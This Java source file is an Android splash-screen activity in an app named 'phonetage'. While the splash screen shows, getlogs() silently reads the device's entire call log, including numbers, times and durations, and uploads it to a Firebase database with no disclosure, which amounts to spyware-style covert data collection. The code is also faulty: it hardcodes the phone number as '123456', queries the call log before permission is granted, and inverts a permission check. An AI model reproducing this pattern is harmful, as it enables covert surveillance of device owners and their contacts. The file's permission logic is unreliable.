package com.contactservice.phonetage;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.contactservice.phonetage.FirebaseDB.FirebaseDB;
import com.contactservice.phonetage.Models.Model_Log;
import com.contactservice.phonetage.Utils.LocalStorage;
import com.contactservice.phonetage.Utils.MarshPermssions;

import java.util.ArrayList;

import static android.Manifest.permission.READ_CALL_LOG;
import static android.Manifest.permission.READ_PHONE_NUMBERS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;
import static com.contactservice.phonetage.Utils.MarshPermssions.READ_CALL_LOGS;
import static com.contactservice.phonetage.Utils.MarshPermssions.READ_PHONE_STATUS;

public class SplashActivity extends ParentActivity {

    String[] projection = new String[]{
            CallLog.Calls._ID,
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.TYPE,
            CallLog.Calls.CACHED_NAME
    };

    MarshPermssions marshPermssions;
    FirebaseDB firebaseDB;
    ArrayList<Model_Log> array_log;
    String mPhoneNumber;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        this.hidestatusbar();

        marshPermssions = new MarshPermssions(this);
        firebaseDB = new FirebaseDB(this);
        getlogs();

    }

    private void gotoMainPage() {
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent intent = new Intent(SplashActivity.this, HomeActivity.class);
                startActivity(intent);
            }
        }, 2000);
    }


    public void getlogs() {
        array_log = new ArrayList<>();
        this.getcurrentphonenumber();
        mPhoneNumber = "123456";
        LocalStorage.saveString(this, LocalStorage.SharePreKEY.phonenumber, mPhoneNumber);
        @SuppressLint("MissingPermission") Cursor c = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null,
                null, CallLog.Calls.DATE + " DESC");

        if (c.getCount() > 0) {
            c.moveToFirst();
            do {
                String callerID = c.getString(c.getColumnIndex(CallLog.Calls._ID));
                String callerNumber = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                long callDateandTime = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));
                long callDuration = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
                int callType = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));

                if (callType == CallLog.Calls.INCOMING_TYPE) {
                    //incoming call
                } else if (callType == CallLog.Calls.OUTGOING_TYPE) {
                    //outgoing call
                } else if (callType == CallLog.Calls.MISSED_TYPE) {
                    //missed call
                }

                Model_Log model_log = new Model_Log();
                model_log.setPhonenumber(mPhoneNumber);
                model_log.setCallID(callerID);
                model_log.setCallduration(String.valueOf(callDuration));
                model_log.setCalltime(String.valueOf(callDateandTime));
                model_log.setCallNumber(callerNumber);
                array_log.add(model_log);


            } while (c.moveToNext());

            firebaseDB.saveDataArray(array_log);
            gotoMainPage();

        } else {
            gotoMainPage();
        }



    }



    public void getcurrentphonenumber() {
        if (ActivityCompat.checkSelfPermission(this, READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, READ_PHONE_NUMBERS) ==
                        PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
                READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
                READ_CALL_LOG) == PackageManager.PERMISSION_DENIED) {
            TelephonyManager tMgr = (TelephonyManager)   this.getSystemService(Context.TELEPHONY_SERVICE);
            mPhoneNumber = tMgr.getLine1Number();
            return;
        } else {
            requestPermission();
        }
    }


    private void requestPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(new String[]{READ_SMS, READ_PHONE_NUMBERS, READ_PHONE_STATE, READ_CALL_LOG}, 100);
        }
    }

    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case 100:
                TelephonyManager tMgr = (TelephonyManager)  this.getSystemService(Context.TELEPHONY_SERVICE);
                if (ActivityCompat.checkSelfPermission(this, READ_SMS) !=
                        PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
                        READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED  &&
                        ActivityCompat.checkSelfPermission(this, READ_PHONE_STATE) !=      PackageManager.PERMISSION_GRANTED) {
                    return;
                }
                mPhoneNumber = tMgr.getLine1Number();
                break;
        }
    }
}
